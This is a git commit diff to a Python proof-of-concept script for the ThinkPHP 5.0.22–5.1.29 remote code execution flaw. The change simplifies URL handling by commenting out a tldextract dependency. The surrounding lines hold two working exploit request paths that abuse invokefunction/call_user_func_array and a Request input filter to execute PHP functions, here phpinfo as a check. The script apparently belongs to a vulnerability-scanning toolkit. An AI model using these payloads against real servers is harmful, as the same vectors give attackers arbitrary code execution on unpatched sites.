ca954734f3fb14ba53f792378bf4d5498a0874ea
saucerman <gyq0929@gmail.com>
2018-12-11 22:50:25 +0800

    ThinkPHP5 5.0.22-5.1.29 远程代码执行

--- scripts/thinkphp_rce.py
+++ scripts/thinkphp_rce.py
@@ -8,24 +8,26 @@ See the file 'LICENSE' for copying permission
 
 import sys
 import requests
-try :
-    import tldextract
-except:
-    print('Cant import tldextract \nTry \"pip install tldextract\"')
-    sys.exit()
+# try :
+#     import tldextract
+# except:
+#     print('Cant import tldextract \nTry \"pip install tldextract\"')
+#     sys.exit()
 
 def poc(domain_url):
     try:
-        if "https://" in domain_url:
-            protocol = "https://"
-        else:
-            protocol = "http://"
+        # if "https://" in domain_url:
+        #     protocol = "https://"
+        # else:
+        #     protocol = "http://"
         
         # return to top path 
         # 'https://www.xiaogeng.com.cn/admin.php?id=6'==>'https://www.xiaogeng.com.cn'
-        key_tmp  = tldextract.extract(domain_url)
-        domain_url = protocol + key_tmp.subdomain + '.' + key_tmp.domain+'.' + key_tmp.suffix 
+        #key_tmp  = tldextract.extract(domain_url)
+        #domain_url = protocol + key_tmp.subdomain + '.' + key_tmp.domain+'.' + key_tmp.suffix 
 
+        if "http" not in domain_url:
+            domain_url = "http://" + domain_url
         thinkphp50_poc = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
         thinkphp51_poc = r"/?s=index/\think\Request/input&filter=phpinfo&data=1"
         
